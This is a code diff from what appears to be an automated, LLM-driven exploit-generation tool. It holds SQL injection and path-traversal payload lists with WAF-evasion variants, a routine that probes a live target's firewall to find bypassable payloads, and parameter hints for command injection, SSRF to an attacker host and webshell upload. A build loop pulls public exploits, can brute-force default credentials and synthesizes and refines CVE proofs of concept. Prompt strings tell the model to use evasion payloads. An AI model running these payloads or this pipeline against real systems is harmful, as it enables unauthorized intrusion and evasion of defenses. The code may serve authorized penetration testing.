+            ("nested comment",  "' /*!50000OR*/ '1'='1--"),
+            ("url-encoded quote","%2527 OR %25271%2527=%25271--"),
+            ("no-space UNION",  "'UNION/**/SELECT/**/1--"),
+            ("backtick col",    "' OR `1`=`1--"),
+        ],
+        "LFI": [
+            ("plain",           "../../../etc/passwd"),
+            ("double-encode",   "%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
+            ("unicode",         "..%c0%af..%c0%afetc%c0%afpasswd"),
+            ("null byte",       "../../../etc/passwd%00"),
+            ("backslash",       "..\\..\\..\\etc\\passwd"),
+            ("php wrapper",     "php://filter/convert.base64-encode/resource=/etc/passwd"),
+            ("nested traversal","....//....//....//etc/passwd"),
+        ],
+    }
+    result = {}   # {class: {variant_label: verdict}}
+    passed = {}   # {class: [variant_labels]} — the proven-passable ones
+    def _probe_variant(payload_value):
+        # Send as ?x=<value> — cheap, doesn't need per-vuln endpoint. If the WAF blocks
+        # the SHAPE (chars, regex), it fires regardless of the param name.
+        try:
+            with _hx.Client(verify=False, follow_redirects=False, timeout=timeout) as cli:
+                # httpx auto-encodes params — pass the raw payload as the value.
+                r = cli.get(base + "/", params={"x": payload_value})
+                body = (r.text or "")[:8000]
+                # WAF block detection
+                for needle, _name, _fam in _WAF_FINGERPRINTS:
+                    if needle in body or needle.lower() in body.lower():
+                        return "BLOCKED", r.status_code, len(body)
+                # 4xx/5xx that wasn't the WAF -> inconclusive
+                if r.status_code >= 400:
+                    return "INCONCLUSIVE", r.status_code, len(body)
+                return "PASSED", r.status_code, len(body)
+        except Exception:  # noqa: BLE001
+            return "INCONCLUSIVE", None, None
+    lines = []
+    for vc, tests in shapes.items():
+        result[vc] = {}
+        passed[vc] = []
+        cls_lines = []
+        for label, payload in tests:
+            verdict, status, ln = _probe_variant(payload)
+            result[vc][label] = verdict
+            if verdict == "PASSED" and label != "plain":
+                passed[vc].append(label)
+            cls_lines.append(f"      {label:<18} -> {verdict}"
+                             + (f" ({status})" if status else ""))
+        lines.append(f"  {vc}:")
+        lines.extend(cls_lines)
+    # Summary
+    proven_summary = []
+    for vc, ok_list in passed.items():
+        # If plain wasn't blocked, the WAF isn't guarding this class — skip
+        if result[vc].get("plain") == "PASSED":
+            proven_summary.append(f"{vc}: plain payload passes (WAF isn't guarding this class)")
+        elif ok_list:
+            proven_summary.append(f"{vc}: proven-passable variants -> {', '.join(ok_list)}")
+        else:
+            proven_summary.append(f"{vc}: ALL variants blocked (WAF is strong here — try alt vuln class)")
+    guidance = (
+        f"WAF CHARACTERIZED (family={family}): probed 7 shape-families per class. "
+        f"USE ONLY the proven-passable variants below — the plain payload was blocked; "
+        f"other variants were tested empirically on THIS target.\n"
+        + "\n".join(f"  * {line}" for line in proven_summary)
+        + "\n  Detailed per-variant verdicts:\n" + "\n".join(lines)
+    )
+    return guidance, {"proven": passed, "detail": result}
+
+
+def _scout_waf(ip, port, timeout=4):
+    """Detect a WAF sitting in front of the target. Sends four canary probes (SQLi, XSS,
+    LFI, command-injection) and diffs the responses against baseline for status/length
+    changes AND signature-matches for known WAF vendors (Cloudflare, AWS WAF, Sucuri,
+    ModSecurity, F5, 网站防火墙 / Chinese WAF families). Returns a guidance string that
+    tells the strategist and refine loop what evasion techniques to reach for. Empty
+    when no WAF is detected — the caller keeps the vanilla path."""
+    import httpx as _hx
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port or 80}"
+    probes = [
+        ("baseline",     "/"),
+        ("sqli",         "/?x=%27%20OR%20%271%27%3D%271--"),
+        ("xss",          "/?x=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"),
+        ("cmdi",         "/?x=%3Bid"),
+        ("lfi",          "/?x=..%2F..%2F..%2Fetc%2Fpasswd"),
+    ]
+    try:
+        with _hx.Client(verify=False, follow_redirects=False, timeout=timeout) as cli:
+            base_len = None; base_status = None
+            findings = []
+            waf_name = None; waf_family = None; triggered_by = None
+            for label, path in probes:
+                try:
+                    r = cli.get(base + path)
+                    body = (r.text or "")[:6000]
+                    hdrs = " ".join(f"{k}:{v}" for k, v in r.headers.items()).lower()
+                    if label == "baseline":
+                        base_len = len(body); base_status = r.status_code
+                        # Check headers for WAF fingerprints too (Server: cloudflare, etc.)
+                        for needle, name, family in _WAF_FINGERPRINTS:
+                            if needle.lower() in hdrs:
+                                waf_name = name; waf_family = family; triggered_by = f"header ({needle})"
+                                break
+                        continue
+                    # Length/status change signal
+                    delta_pct = abs(len(body) - (base_len or 0)) / max(1, base_len or 1)
+                    status_flip = (r.status_code != base_status) and r.status_code != 200
+                    # Signature match
+                    for needle, name, family in _WAF_FINGERPRINTS:
+                        if needle.lower() in body.lower() or needle in body:
+                            if not waf_name:
+                                waf_name = name; waf_family = family
+                            triggered_by = f"{label} probe -> body match `{needle[:24]}`"
+                            findings.append(f"{label}: BLOCKED (matched `{needle[:24]}`)")
+                            break
+                    else:
+                        # No explicit signature, but response is very different -> generic WAF
+                        if status_flip or delta_pct > 0.6:
+                            if not waf_name:
+                                waf_name = "generic WAF (heuristic)"
+                                waf_family = "generic"
+                                triggered_by = f"{label} probe -> {r.status_code} + Δ{int(delta_pct*100)}%"
+                            findings.append(f"{label}: anomalous ({r.status_code}, Δ{int(delta_pct*100)}%)")
+                        else:
+                            findings.append(f"{label}: passed (no WAF response)")
+                except Exception:  # noqa: BLE001
+                    findings.append(f"{label}: probe error")
+    except Exception:  # noqa: BLE001
+        return ""
+    if not waf_name:
+        return ""  # no WAF -> keep silent
+    return (f"WAF DETECTED: {waf_name} (family={waf_family}, triggered by "
+            f"{triggered_by}). Probe results: {' | '.join(findings)}. "
+            f"You MUST use evasion variants — do NOT send plain `' OR '1'='1--`, "
+            f"`;id`, `<script>` or `../../etc/passwd`; they will be blocked. "
+            f"WAF FAMILY: {waf_family}.")
+
+
+def _arjun_classify_param(name):
+    """Map a param name to its likely vulnerability class + a payload shape hint. Helps
+    the LLM synth pick the RIGHT primitive rather than guessing at param semantics.
+    Returns (class, payload_hint) or None. Best-effort semantic match — a `cmd` param
+    is 95% of the time RCE; a `url` param is 90% SSRF/open-redirect; etc."""
+    n = str(name or "").lower().strip()
+    if not n:
+        return None
+    # Command injection — highest priority (RCE trumps everything on the objective list)
+    for kw in ("cmd", "command", "exec", "execute", "run", "system", "shell",
+               "code", "eval", "exec_", "op"):
+        if n == kw or n.startswith(kw + "_") or n.endswith("_" + kw):
+            return ("COMMAND INJECTION / RCE",
+                    f"try `?{name}=id` (proof marker) or `?{name}=;id` / `?{name}=|id` for shell chaining")
+    # LFI / path traversal
+    for kw in ("file", "path", "page", "template", "include", "require",
+               "doc", "document", "view", "read", "load"):
+        if n == kw or n.startswith(kw + "_") or n.endswith("_" + kw):
+            return ("LFI / path traversal",
+                    f"try `?{name}=../../../../etc/passwd` or `?{name}=/etc/hostname`")
+    # SSRF / open redirect
+    for kw in ("url", "uri", "link", "redirect", "next", "return", "callback",
+               "forward", "goto", "fetch", "target", "dest", "host"):
+        if n == kw or n.startswith(kw + "_") or n.endswith("_" + kw):
+            return ("SSRF / open redirect",
+                    f"try `?{name}=http://<attacker>/` or `?{name}=file:///etc/passwd`")
+    # SQLi
+    for kw in ("id", "uid", "pid", "cid", "user_id", "post_id", "sort", "order",
+               "filter", "search", "q", "query", "category", "cat"):
+        if n == kw or n.startswith(kw + "_") or n.endswith("_" + kw):
+            return ("SQL injection",
+                    f"try `?{name}=1' OR 1=1-- -` or UNION-based on this param")
+    # SSTI
+    for kw in ("tpl", "layout", "theme", "skin", "engine", "render"):
+        if n == kw or n.startswith(kw + "_") or n.endswith("_" + kw):
+            return ("SSTI / template injection",
+                    f"try `?{name}={{7*7}}` (Twig/Jinja) or `?{name}=${{7*7}}` (Freemarker)")
+    # File upload / XXE
+    if n in ("upload", "file_upload", "attach", "attachment", "xml", "content"):
+        return ("File upload / XXE",
+                f"try `POST` with multipart file field `{name}` (webshell) or XML with external entity")
+    return None
+
+
+def _arjun_worth_probing(path):
+    """True when a path is worth an Arjun run — false for static assets. Arjun on a CSS
+    or image endpoint burns 30s to prove nothing; we want app endpoints. Also skip
+    long URLs and query-only artifacts."""
+    if not path or not isinstance(path, str):
+        return False
+    p = path.split("?", 1)[0].split("#", 1)[0].lower()
+    if len(p) > 120:
+        return False
+    for ext in (".css", ".js", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
+                ".ico", ".woff", ".woff2", ".ttf", ".eot", ".pdf", ".mp4",
+                ".webp", ".webm", ".mp3", ".zip"):
+        if p.endswith(ext):
+            return False
+    # Static-asset directory prefixes — the paths under them are covered by root probes.
+    for pfx in ("/assets/", "/static/", "/template/", "/dist/", "/build/",
+                "/vendor/", "/node_modules/", "/fonts/", "/images/", "/img/",
+                "/css/", "/js/", "/media/", "/favicon"):
+        if p.startswith(pfx):
+            return False
+    return True
+
+
+def _openapi_discover(ip, port, auth=None, timeout=8):
+    """Probe common OpenAPI/Swagger paths and parse the first spec we hit.
+
+    API-first apps (Prefect, FastAPI, Zabbix post-6.4, half of the Python
+    ecosystem) publish a machine-readable OpenAPI spec at a well-known path.
+    When the ZAP spider only turns up static chunks (classic SPA problem),
+    the spec is the real attack surface — every endpoint, every param, every
+    request body schema in one GET. Feeding that to synth closes the gap
+    between "crawler saw nothing" and "LLM knows every endpoint".
+
+    Returns (guidance_str, api_urls:list). guidance_str is the compact text
+    folded into the synth prompt; api_urls is handed to focused_active_scan
+    + arjun so the dispatcher can target the actual API paths.
+
+    Fails CLOSED to ('', []) on any error — never breaks the build path.
+    """
+    import httpx as _hx
+    import re as _re
+    # Common paths — merged list from knowledge/common_web_paths.yaml +
+    # vendor-specific defaults. Keep in sync with knowledge YAML.
+    candidate_paths = [
+        "/openapi.json", "/api/openapi.json",
+        "/api/v1/openapi.json", "/api/v2/openapi.json", "/api/v3/openapi.json",
+        "/swagger.json", "/api/swagger.json", "/v2/api-docs", "/v3/api-docs",
+        "/api-docs", "/api/docs/swagger.json", "/docs/openapi.json",
+    ]
+    headers = {"accept": "application/json, */*"}
+    if auth and isinstance(auth, dict):
+        if auth.get("bearer"):
+            headers["authorization"] = f"Bearer {auth['bearer']}"
+        if auth.get("cookie"):
+            headers["cookie"] = auth["cookie"]
+    # Scheme heuristic: use port to guess default, but FALL BACK to the
+    # other scheme if the first attempt gets Server-disconnected (TLS
+    # listener on a non-443 port, or plain HTTP on 8443). Many apps serve
+    # TLS on 8000/8080 or plain on 8443 — the port alone isn't a reliable
+    # signal.
+    port_i = int(port or 80)
+    guess = "https" if port_i in (443, 8443) else "http"
+    schemes = [guess, ("http" if guess == "https" else "https")]
+    spec = None
+    hit_path = None
+    hit_scheme = None
+    try:
+        with _hx.Client(timeout=timeout, verify=False, follow_redirects=True) as cli:
+            for scheme in schemes:
+                if spec: break
+                base = f"{scheme}://{ip}:{port_i}"
+                scheme_dead = False
+                for p in candidate_paths:
+                    try:
+                        r = cli.get(base + p, headers=headers)
+                    except Exception as _pe:  # noqa: BLE001
+                        # If the first probe on this scheme can't even connect,
+                        # the whole scheme is dead — bail and let the other
+                        # scheme try (don't waste 11 more TCP handshakes).
+                        if p == candidate_paths[0]:
+                            scheme_dead = True
+                            break
+                        continue
+                    if r.status_code != 200:
+                        continue
+                    ct = (r.headers.get("content-type") or "").lower()
+                    if "json" not in ct and not (r.text or "").lstrip().startswith("{"):
+                        continue
+                    try:
+                        j = r.json()
+                    except Exception:  # noqa: BLE001
+                        continue
+                    if not isinstance(j, dict):
+                        continue
+                    # OpenAPI 3.x has 'openapi', Swagger 2.x has 'swagger'.
+                    if "paths" in j and ("openapi" in j or "swagger" in j):
+                        spec = j; hit_path = p; hit_scheme = scheme; break
+    except Exception as e:  # noqa: BLE001
+        logging.debug("openapi probe failed: %s", e)
+        return "", []
+    # Rebuild base from the scheme that actually worked
+    base = f"{hit_scheme or schemes[0]}://{ip}:{port_i}"
+    if not spec:
+        return "", []
+    # Extract endpoints + methods + param hints. Keep each entry under one
+    # line so synth can see 20+ endpoints without blowing the prompt.
+    api_urls = []
+    endpoint_lines = []
+    paths_obj = spec.get("paths") or {}
+    # OpenAPI uses {var} path templates; keep as-is for operator reference,
+    # but build URLs for focused active scan by stripping them to the
+    # non-templated prefix (ZAP can't attack a template directly).
+    for raw_path, methods in list(paths_obj.items())[:60]:
+        if not isinstance(methods, dict):
+            continue
+        for method, op in methods.items():
+            if method.lower() not in ("get", "post", "put", "patch", "delete"):
+                continue
+            if not isinstance(op, dict):
+                continue
+            op_id = op.get("operationId") or op.get("summary") or ""
+            params = op.get("parameters") or []
+            param_names = []
+            for pr in params[:8]:
+                if isinstance(pr, dict) and pr.get("name"):
+                    loc = pr.get("in", "")
+                    param_names.append(f"{pr['name']}{'(' + loc + ')' if loc else ''}")
+            body_hint = ""
+            rb = op.get("requestBody") or {}
+            if isinstance(rb, dict):
+                content = rb.get("content") or {}
+                if isinstance(content, dict):
+                    for ctype, cschema in content.items():
+                        if isinstance(cschema, dict):
+                            sch = cschema.get("schema") or {}
+                            if isinstance(sch, dict):
+                                props = (sch.get("properties") or {}) if sch.get("type") == "object" else {}
+                                if props:
+                                    body_hint = f" body={ctype}:{','.join(list(props.keys())[:6])}"
+                                else:
+                                    body_hint = f" body={ctype}"
+                                break
+            # Line: METHOD /path  op_id  params=[a,b]  body=application/json:field1,field2
+            line = f"{method.upper():6s} {raw_path}"
+            if op_id: line += f"  op={op_id[:40]}"
+            if param_names: line += f"  params=[{','.join(param_names)}]"
+            if body_hint: line += body_hint
+            endpoint_lines.append(line)
+            # Build a concrete URL (strip {templated} parts for the focused scan)
+            concrete = _re.sub(r"\{[^}]+\}", "1", raw_path)
+            api_urls.append(base + concrete)
+    if not endpoint_lines:
+        return "", []
+    # Dedup + cap
+    seen = set(); dedup = []
+    for u in api_urls:
+        if u not in seen:
+            seen.add(u); dedup.append(u)
+    api_urls = dedup[:30]
+    header = f"OpenAPI spec FOUND at {hit_path} ({len(endpoint_lines)} operations). " \
+             "The crawler would NOT have reached these — they are the REAL attack surface:\n"
+    guidance = header + "\n".join(f"  - {ln}" for ln in endpoint_lines[:40])
+    return guidance, api_urls
+
+
+def _playwright_sitemap(ip, port, auth=None, timeout=180, max_pages=50, max_depth=3):
+    """Headless-browser crawl via playwright-scanner for SPAs the ZAP spider
+    cannot see. Routes browser traffic THROUGH ZAP's proxy so every XHR the
+    browser fires lands in ZAP's site tree + gets passive-scanned. After the
+    crawl finishes, re-pulls ZAP's URL tree (`/JSON/core/view/urls/`) to
+    get the FULL set of URLs the browser actually touched — including XHRs
+    that fire late and were missed by the browser's own request listener.
+
+    Fails CLOSED to ('', []) on any error.
+
+    Rationale: ZAP's HTML spider only follows anchors — SPAs expose their
+    routes through fetch()/XHR triggered by JS. Playwright + ZAP-proxy
+    captures them all, then ZAP's passive scan has a full tree to work on.
+    """
+    import httpx as _hx, time as _t, urllib.parse as _up
+    scanner = os.environ.get("PLAYWRIGHT_SCANNER_URL", "https://playwright-scanner:8014")
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    target = f"{scheme}://{ip}:{port or 80}/"
+    body = {
+        # Route through ZAP proxy so the browser's every XHR populates ZAP's
+        # site tree. We re-pull from ZAP after the crawl completes.
+        "url": target, "max_depth": max_depth, "max_pages": max_pages,
+        "use_zap_proxy": True, "timeout_per_page": 20, "same_origin_only": True,
+        "capture_screenshots": False,
+    }
+    if auth and isinstance(auth, dict):
+        a = {}
+        for k in ("login_url", "login_data", "username", "password"):
+            if auth.get(k): a[k] = auth[k]
+        if a:
+            body["auth"] = a
+    discovered = []
+    try:
+        with _hx.Client(timeout=20, verify=False) as cli:
+            r = cli.post(f"{scanner.rstrip('/')}/crawl", json=body,
+                         headers={"x-api-key": API_KEY})
+            if r.status_code != 200:
+                return "", []
+            job_id = r.json().get("job_id")
+            if not job_id:
+                return "", []
+            t0 = _t.time()
+            while _t.time() - t0 < timeout:
+                _t.sleep(5)
+                st = cli.get(f"{scanner.rstrip('/')}/crawl/{job_id}",
+                             headers={"x-api-key": API_KEY})
+                if st.status_code != 200:
+                    continue
+                j = st.json()
+                if j.get("status") in ("completed", "finished", "done"):
+                    discovered = j.get("discovered_urls") or []
+                    break
+                if j.get("status") in ("failed", "error"):
+                    break
+    except Exception as e:  # noqa: BLE001
+        logging.debug("playwright sitemap failed: %s", e)
+    # Pull ZAP's full URL tree for this host — catches every XHR the browser
+    # actually fired through the proxy, even late-firing ones the browser's
+    # own request listener may have missed.
+    zap_url = os.environ.get("ZAP_URL", "http://zap:8090").rstrip("/")
+    zap_key = os.environ.get("ZAP_API_KEY", "changeme")
+    zap_tree = []
+    try:
+        with _hx.Client(timeout=15, verify=False) as cli:
+            r = cli.get(f"{zap_url}/JSON/core/view/urls/?"
+                        + _up.urlencode({"apikey": zap_key, "baseurl": target.rstrip("/")}))
+            if r.status_code == 200:
+                zap_tree = r.json().get("urls") or []
+    except Exception as _ze:  # noqa: BLE001
+        logging.debug("zap tree fetch failed: %s", _ze)
+    all_urls = list(discovered or []) + list(zap_tree or [])
+    if not all_urls:
+        return "", []
+    # Dedup preserving order; cap. Prefer non-static URLs so the LLM sees
+    # app routes first, not every JS bundle.
+    static_markers = ("_next", "/static/", "/chunks/", "/assets/",
+                       ".js", ".css", ".map", ".woff", ".ttf", ".svg")
+    def _is_static(u):
+        try:
+            path = _up.urlparse(u).path.lower()
+        except Exception:  # noqa: BLE001
+            return False
+        return any(m in path for m in static_markers)
+    seen = set(); dynamic = []; static = []
+    for u in all_urls:
+        if u and u not in seen:
+            seen.add(u)
+            (static if _is_static(u) else dynamic).append(u)
+    dedup = dynamic[:30] + static[:10]  # dynamic first so synth sees real routes
+    def _rel(u):
+        if u.startswith(target): return u[len(target.rstrip('/')):]
+        return u
+    lines = [f"  - {_rel(u)}" for u in dedup[:30]]
+    guidance = (
+        f"Playwright SPA crawl discovered {len(dedup)} URLs through ZAP's "
+        f"proxy ({len(dynamic)} dynamic routes, {len(static)} static). "
+        "Dynamic routes are the real attack surface — the HTML spider never "
+        "sees them because they fire via JS/XHR after page load:\n"
+        + "\n".join(lines))
+    return guidance, dedup
+
+
+def _extract_zap_paths(zap_guidance):
+    """Pull the distinct paths out of a `_zap_recon` guidance string. Returns [] on
+    empty input. The string format is stable — 'ZAP-spidered paths: /a, /b, /c'."""
+    if not zap_guidance:
+        return []
+    import re as _re
+    m = _re.search(r"ZAP-spidered paths:\s*([^|]+?)(?:\s*\||$)", zap_guidance)
+    if not m:
+        return []
+    return [p.strip() for p in m.group(1).split(",") if p.strip()]
+
+
+def _scout_arjun_paths(ip, port, paths, max_targets=5, timeout_per_path=45, threads=25):
+    """Fan Arjun across a list of paths — deep param discovery, not just at root. Skips
+    static assets (see _arjun_worth_probing) and caps at max_targets so we spend the
+    time budget on the highest-signal endpoints. Aggregates per-path findings into a
+    single guidance string.
+    Rationale: Arjun on '/' only finds params the app honors at the root; hidden
+    endpoints like /pwd/, /admin/, /api/v1/... have their own param sets."""
+    if not paths:
+        return "", {}
+    interesting = [p for p in paths if _arjun_worth_probing(p)]
+    # Always include root as the anchor, if the caller didn't already
+    if "/" not in interesting:
+        interesting = ["/"] + interesting
+    # Cap and de-dupe while preserving order
+    seen = set(); ordered = []
+    for p in interesting:
+        if p in seen:
+            continue
+        seen.add(p); ordered.append(p)
+        if len(ordered) >= max_targets:
+            break
+    per_path = {}
+    lines = []
+    classified = []  # (path, param, class, hint) — the strongest signals
+    for p in ordered:
+        one = _scout_arjun(ip, port, path=p, timeout=timeout_per_path, threads=threads)
+        per_path[p] = one
+        if one and "no honored params" not in one:
+            import re as _re
+            m = _re.search(r"honored params[^:]*:\s*([^\.]+)\.", one)
+            if m:
+                params_str = m.group(1).strip()
+                lines.append(f"  {p}: {params_str}")
+                # Classify each param — highest-signal params (cmd/exec/url/file/id) get
+                # elevated with a class + payload shape so the LLM doesn't have to guess.
+                for pname in [x.strip() for x in params_str.split(",") if x.strip()]:
+                    cls = _arjun_classify_param(pname)
+                    if cls:
+                        classified.append((p, pname, cls[0], cls[1]))
+    if not lines:
+        return "Arjun deep-scan: no honored params on any spidered endpoint", per_path
+    body = ("Arjun deep-scan (params honored per endpoint):\n" + "\n".join(lines))
+    if classified:
+        body += ("\n\nCLASSIFIED HIGH-SIGNAL PARAMS (strongest suspects — try these FIRST):\n"
+                 + "\n".join(f"  {path} param `{pname}` → likely {cls}. {hint}"
+                             for path, pname, cls, hint in classified))
+    return body, per_path
+
+
+def _scout_arjun(ip, port, path="/", timeout=60, threads=25):
+    """Parameter-name discovery on a single URL via Arjun. Diffs baseline vs test
+    requests to spot params the app honors (reflection / status / length change) —
+    answers "which query params are wired up" definitively before synth guesses.
+    Returns short guidance string; empty on any failure (never breaks a build).
+    Rationale: hrefs on the landing page reveal params only when the app links to
+    them; Arjun finds the hidden ones (id, page, file, cmd, redirect, callback, ...)."""
+    import subprocess as _sp, tempfile as _tf, json as _js, os as _os
+    if not ip:
+        return ""
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    url = f"{scheme}://{ip}:{port or 80}{path if path.startswith('/') else '/' + path}"
+    try:
+        with _tf.NamedTemporaryFile("r", suffix=".json", delete=False) as fh:
+            out_path = fh.name
+        r = _sp.run(
+            ["arjun", "-u", url, "-o", out_path, "-t", str(threads),
+             "--disable-redirects", "-q"],
+            capture_output=True, text=True, timeout=timeout,
+        )
+        if not _os.path.exists(out_path):
+            return ""
+        try:
+            with open(out_path) as fh:
+                data = _js.load(fh)
+        finally:
+            try: _os.unlink(out_path)
+            except Exception: pass
+        # Arjun's JSON schema: {url: {params: [...], method, ...}} — normalize.
+        params = []
+        for key, val in (data or {}).items():
+            if isinstance(val, dict):
+                params.extend(val.get("params") or [])
+            elif isinstance(val, list):
+                params.extend(val)
+        params = [str(p) for p in params][:16]
+        if not params:
+            return f"Arjun recon on {url}: no honored params discovered"
+        return (f"Arjun recon on {url} ({len(params)} honored params — the app "
+                f"reacts differently when these are set): {', '.join(params)}. "
+                f"Try these as injection points before guessing at param names.")
+    except _sp.TimeoutExpired:
+        return f"Arjun recon on {url}: TIMEOUT after {timeout}s"
+    except FileNotFoundError:
+        return ""  # arjun not installed (development env)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("arjun recon failed: %s", e)
+        return ""
 
 
 def _scout_url_recon(ip, port, timeout=8):
@@ -14548,119 +18227,536 @@ def _zap_recon(ip, port, spider_timeout=90, active_scan=False):
     return "ZAP recon: " + " | ".join(parts)
 
 
+def _zap_focused_active_scan(ip, port, urls, max_total_wait=300, per_url_wait=90):
+    """Focused ZAP active scan over a specific list of URLs (not the whole host).
+
+    The generic `_zap_recon(active_scan=True)` scans the entire target recursively.
+    This variant lets the caller hand in URLs the generic spider would NOT reach —
+    typically arjun's live findings, Burp's `discovered_params`, or an operator's
+    tweaked request from Repeater — and runs an active scan per URL with
+    `recurse=false` so each one gets focused attack vectors on its specific
+    parameters rather than attention diluted across the whole site.
+
+    Returns a compact guidance string in the same shape `_zap_recon` emits:
+    "ZAP focused-active: <URL> - [risk] <alert_name> (param=<p>) evidence: ...".
+    Returns "" on any error so the escalation path never breaks the build.
+    """
+    import httpx as _hx, time as _t, urllib.parse as _up
+    if not urls:
+        return ""
+    zap_url = os.environ.get("ZAP_URL", "http://zap:8090").rstrip("/")
+    zap_key = os.environ.get("ZAP_API_KEY", "changeme")
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    host_prefix = f"{scheme}://{ip}:{port or 80}"
+
+    def _api(path, **params):
+        params["apikey"] = zap_key
+        return f"{zap_url}{path}?" + _up.urlencode(params)
+
+    # Normalize each URL to absolute form and keep only ones under this host.
+    # (ZAP's inScopeOnly=true would silently drop out-of-scope URLs otherwise.)
+    norm = []
+    for u in urls:
+        if not u: continue
+        if u.startswith("http://") or u.startswith("https://"):
+            if u.startswith(host_prefix):
+                norm.append(u)
+        else:
+            norm.append(host_prefix + (u if u.startswith("/") else "/" + u))
+    if not norm:
+        return ""
+    # Dedup while preserving order; cap at 10 so a huge arjun fanout can't
+    # consume the whole escalation budget.
+    seen = set(); dedup = []
+    for u in norm:
+        if u in seen: continue
+        seen.add(u); dedup.append(u)
+    dedup = dedup[:10]
+
+    parts = []
+    deadline = _t.time() + max_total_wait
+    try:
+        with _hx.Client(timeout=15, verify=False) as cli:
+            # Verify ZAP alive
+            r = cli.get(_api("/JSON/core/view/version/"))
+            if r.status_code != 200:
+                return ""
+            for u in dedup:
+                if _t.time() >= deadline:
+                    parts.append(f"(stopped early — budget exhausted after {len(parts)} URLs)")
+                    break
+                # Kick a focused scan on just this URL
+                r = cli.get(_api("/JSON/ascan/action/scan/", url=u, recurse="false",
+                                 inScopeOnly="true"))
+                if r.status_code != 200:
+                    continue
+                sid = r.json().get("scan")
+                if not sid:
+                    continue
+                # Poll per-URL (bounded)
+                t0 = _t.time()
+                while _t.time() - t0 < per_url_wait and _t.time() < deadline:
+                    _t.sleep(3)
+                    st = cli.get(_api("/JSON/ascan/view/status/", scanId=str(sid)))
+                    if st.status_code == 200 and int(st.json().get("status", 0)) >= 100:
+                        break
+                # Pull alerts for THIS URL (baseurl filter so other-URL alerts
+                # don't dilute the per-URL signal)
+                r = cli.get(_api("/JSON/alert/view/alerts/", baseurl=u))
+                if r.status_code != 200:
+                    continue
+                alerts = r.json().get("alerts") or []
+                if not alerts:
+                    continue
+                loc = u[len(host_prefix):] if u.startswith(host_prefix) else u
+                for a in alerts[:5]:  # top 5 alerts per URL
+                    name = a.get("name", "")
+                    if not name: continue
+                    risk = a.get("risk", ""); param = a.get("param", "")
+                    ev = (a.get("evidence") or "")[:80]
+                    parts.append(f"  - {loc}: [{risk}] {name}"
+                                 + (f" (param={param})" if param else "")
+                                 + (f" evidence: {ev}" if ev else ""))
+    except Exception as e:  # noqa: BLE001
+        logging.debug("zap focused-active failed: %s", e)
+        return ""
+    if not parts:
+        return ""
+    return "ZAP focused-active (per-URL attacks on arjun/burp-discovered endpoints):\n" + "\n".join(parts)
+
+
 def _build_poc_core(cve, ip, port, product, version, eid, max_iters=3, research=True, model=None,
-                    auth=None, recon_first=False, recon_source="basic"):
-    """The full automatic-creation loop: RESEARCH (pull reference PoC material) -> synthesize
-    -> run-and-refine -> anchor/reflection verify -> auto-save into the Exploit Store (with
-    Python + Burp HTTP artifacts). Shared by the /software/build-poc endpoint AND the
-    detection->exploit resolver's no-public-exploit fallback. `research=True` seeds the synth
-    with real public-exploit material (what makes a PoC land vs a description-only guess).
-    Returns the result dict incl. exploit_store_id. Caller owns the authorization (grant) check."""
-    import time as _t
-    _t0 = _t.time()
-    run_id = f"{cve}_{ip}_{int(_t.time())}"
-    # Recon: seed synth with real attack-surface knowledge before research runs. Sources:
-    #   basic     — fast self-fetch (page/robots/forms), ~2s
-    #   zap       — ZAP spider (paths + passive alerts), ~90s
-    #   zap-active— ZAP spider + active scanner (probes for XSS/SQLi/LFI/etc), ~3-5min
-    #   both      — basic + zap combined
-    # Any failure returns empty and continues without recon (never breaks the build).
-    recon_guidance = ""
-    if recon_first:
-        sources = str(recon_source or "basic").lower()
-        segments = []
-        try:
-            if "basic" in sources or sources == "both":
-                b = _scout_url_recon(ip, port)
-                if b: segments.append(b)
-            if "zap" in sources:
-                z = _zap_recon(ip, port, active_scan=("active" in sources))
-                if z: segments.append(z)
-        except Exception:  # noqa: BLE001
-            pass
-        recon_guidance = " ".join(segments)
-    # Auth: establish a logged-in session (supplied creds, or brute-force default creds) so
-    # an authenticated attack surface is reachable, and hand the cookie to synth.
-    auth_guidance = ""; session_info = None
-    if auth and (auth.get("username") or auth.get("bruteforce")):
-        try:
-            session_info = _establish_session_for_build(ip, port, auth, eid)
-            ch = (session_info or {}).get("cookie_header")
-            if ch:
-                auth_guidance = (f"AUTH: an authenticated session exists — send this cookie in "
-                                 f"EVERY exploit request: Cookie: {ch}. (user "
-                                 f"{session_info.get('username')}). ")
-        except Exception as e:  # noqa: BLE001
-            logging.debug("build auth step failed: %s", e)
-    # Automatic reference-PoC research: feed concrete public-exploit material into synth.
-    guidance = (recon_guidance + " " + auth_guidance).strip() if recon_guidance else auth_guidance
-    research_out = None
-    if research:
-        try:
-            research_out = _research_exploit(cve, ip, port, product, version, eid, model=model)
-            a = research_out.get("analysis") or {}
-            src = research_out.get("sources") or {}
-            parts = []
-            if a:
-                parts.append("Reference exploit analysis (use this concrete material, adapt to the "
-                             f"target): summary={a.get('summary')}; endpoint={a.get('target_endpoint')}; "
-                             f"method={a.get('http_method')}; params={a.get('params')}; "
-                             f"payload={a.get('payload')}; success_signal={a.get('success_signal')}."
-                             + (f" Seed command to adapt: {a.get('seed_command')}" if a.get('seed_command') else ""))
-            # Always hand the synth the RAW retrieved material too — an MSF module name and
-            # the actual ExploitDB PoC text are useful even when the structured analysis is thin.
-            if src.get("msf"):
-                parts.append(f"Metasploit module(s) for this CVE: {', '.join([m for m in src['msf'] if m])}.")
-            ref = research_out.get("reference_poc")
-            if ref:
-                parts.append("Public ExploitDB PoC (adapt the request/payload to the target):\n"
-                             + str(ref)[:3500])
-            guidance = (auth_guidance + " " + " ".join(parts)).strip()
-        except Exception as e:  # noqa: BLE001
-            logging.debug("build research step failed: %s", e)
-    built = _synthesize_cve_poc(cve, ip, port, product, version, eid, run_id=run_id,
-                                guidance_extra=guidance, model=model)
-    result = _run_refine_poc(cve, ip, port, built["command"], built["assertion"], eid,
-                             run_id, rationale=built.get("rationale", ""),
-                             product=product, version=version, max_iters=max_iters,
-                             canary=built.get("canary"), origin_family=built.get("origin_family"),
-                             llm_model=built.get("llm_model"), metrics=built.get("metrics"), model=model)
-    _metrics = result.get("metrics") or {}
-    _metrics["build_seconds"] = round(_t.time() - _t0, 1)
